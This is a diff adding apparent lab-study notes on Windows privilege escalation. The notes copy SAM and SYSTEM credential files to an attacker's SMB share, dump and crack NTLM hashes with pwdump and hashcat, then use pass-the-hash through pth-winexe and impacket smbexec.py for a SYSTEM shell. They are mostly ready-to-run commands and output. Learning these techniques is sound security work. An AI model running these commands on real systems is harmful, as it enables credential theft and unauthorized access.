@@ -1255,12 +1255,181 @@ copy \\10.8.47.102\kali\reverse.exe C:\PrivEsc\reverse.exe
 
 
 - <details>
-     <summary></summary>
+     <summary>Security Account Manager (SAM)</summary>
+
+     > ``The idea of ​​exploitation``
+     > Windows stores user password hashes in a file called ``SAM`` (Security Account Manager).
+     > But the SAM is encrypted, and the key to decrypt it is stored in the ``SYSTEM`` file.
+     
+     
+     > ---
+     > ### 📌 _The idea → If you find a backup copy of these files (such as ``C:\Windows\Repair\``), you can copy them and break the passwords._
+     > ---
+     
+     
+     ## 1. Transfer SAM and SYSTEM files to Kali
+     
+     ```ruby
+     copy C:\Windows\Repair\SAM \\10.8.47.102\kali\
+     copy C:\Windows\Repair\SYSTEM \\10.8.47.102\kali\
+     ```
+     
+     <img width="1247" height="371" alt="image" src="https://github.com/user-attachments/assets/9312c3bf-1ef6-413d-94ba-b0a3dc5dda61" />
+     
+     
+     
+     
+     > ---
+     > ### 📌 _Goal → We take the hashes files and bring them to us so that we can work on them at our convenience._
+     > ---
+     
+     
+     ## 2. Download ``creddump7`` Tool
+     
+     
+     ```ruby
+     git clone https://github.com/Tib3rius/creddump7
+     
+     sudo mv creddump7 /opt/
+     sudo ln -s /opt/creddump7/pwdump.py /usr/local/bin/pwdump
+     ```
+     
+     > Install the encryption library
+     
+     ```python
+     pip3 install pycrypto
+     ```
+     
+     - **`pip3`** : Python3 package manager.
+     - **`install pycrypto`** : We install the `PyCrypto library`so that the tool can extract hashes form files.
+     
+     
+     ## 3. Extracting hashes from files
+     
+     
+     ```ruby
+     pwdump SYSTEM SAM
+     ```
+     
+     <img width="883" height="224" alt="image" src="https://github.com/user-attachments/assets/d6c3d6c5-1652-4ed7-b50a-a351130eee05" />
+     
+     ```ruby
+     Administrator:500:aad3b435b51404eeaad3b435b51404ee:fc525c9683e8fe067095ba2ddc971889:::
+     Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+     DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+     WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:6ebaa6d5e6e601996eefe4b6048834c2:::
+     user:1000:aad3b435b51404eeaad3b435b51404ee:91ef1073f6ae95f5ea6ace91c09a963a:::
+     admin:1001:aad3b435b51404eeaad3b435b51404ee:a9fdfa038c4b75ebc76dc855dd74f0da:::
+     ```
+     
+     
+     >  ```
+     >  Administrator:500:aad3b435b51404eeaad3b435b51404ee:fc525c9683e8fe067095ba2ddc971889:::
+     >  ```
+     
+     - **`Administrator`** : username
+     - **`500`** : The user's RID (Relative Identifier). 500 usually remains the primary Administrator.
+     - **`aad3b435b51404eeaad3b435b51404ee`** : LM hash (if not used, this is the default placeholder).
+     - **`fc525c9683e8fe067095ba2ddc971889`** : NT hash (which we can use to crack the password or pass-the-hash).
+     - **`:::`** : Additional fields are not important to us now.
+     
+     
+     
+     ## 4. Crack the hash using Hashcat
+     
+     
+     ```ruby
+     hashcat -m 1000 -a 0 fc525c9683e8fe067095ba2ddc971889 /usr/share/wordlists/rockyou.txt
+     ```
+     
+     - **`hashcat`** : A powerful tool for cracking passwords.
+     - **`-m 1000`** : It means the hash is of type NTLM.
+     
+     <img width="672" height="166" alt="image" src="https://github.com/user-attachments/assets/05e7ca96-024b-4d9d-91c0-3010dcc1bd54" />
+     
+     
+     
+     
+     ## 5. Exploiting the password after it is broken
+     
+     
+     ```ruby
+     winexe -U 'admin%<password>' //10.10.10.10 cmd.exe
+     
+     Or
+     
+     rdesktop -u admin -p <password> 10.10.10.10
+     ```
+     
+     
+     
+     <img width="681" height="378" alt="image" src="https://github.com/user-attachments/assets/b422fc9e-d7f2-4542-bc24-59d137851956" />
+     
+     
+     
+
+
   </details>
 
 
+
+
+
+
+
+
+
 - <details>
-     <summary></summary>
+     <summary> Passing the Hash</summary>
+     
+     > ---
+     > ### 📌 _The idea → Usually in attacks on Windows, when you have a hash instead of cracking the password, you can use a technique called Pass-the-Hash (PTH).
+     > Idea: The hash is used directly for authentication instead of the actual password.
+     
+     > Why is this useful?
+     
+     > - Save time (you don't need to break the password).
+     
+     > - Some systems may prevent brute-force, but not the use of hash for authentication._
+     > ---
+     
+     
+     ```ruby
+     pth-winexe -U 'admin%aad3b435b51404eeaad3b435b51404ee:a9fdfa038c4b75ebc76dc855dd74f0da' //10.10.148.63 cmd.exe
+     ```
+     
+     or 
+     
+     ```ruby
+     python3 /usr/share/doc/python3-impacket/examples/smbexec.py -hashes aad3b435b51404eeaad3b435b51404ee:a9fdfa038c4b75ebc76dc855dd74f0da admin@10.10.148.63
+     ```
+     
+     
+     <img width="1090" height="261" alt="image" src="https://github.com/user-attachments/assets/d017160b-c081-4946-a00b-5ac68d94c122" />
+     
+     
+     <img width="1099" height="245" alt="image" src="https://github.com/user-attachments/assets/004a30ec-a449-4e55-b8a4-b7bb52ccbe7d" />
+     
+     
+     > `smbexec.py` uses the creation service on Windows to run the shell.
+     
+     > Any service that runs on Windows usually runs under `SYSTEM` privileges.
+     
+     > This means that even if the user you specified is admin, the `shell` that will open will be `SYSTEM` because it is the service on Windows that is running.
+     
+     > This is a great advantage because it gives you the highest powers over the system.
+     
+     
+     
+     | tool                  | Privileges         | method                                             |
+     | --------------------- | ------------------ | -------------------------------------------------- |
+     | `impacket smbexec.py` | SYSTEM             | You create a service and run a shell inside it     |
+     | `pth-winexe`          | Admin              | Regular logon and shell execution in user session  |
+     
+     
+     
+
+
   </details>
 
 
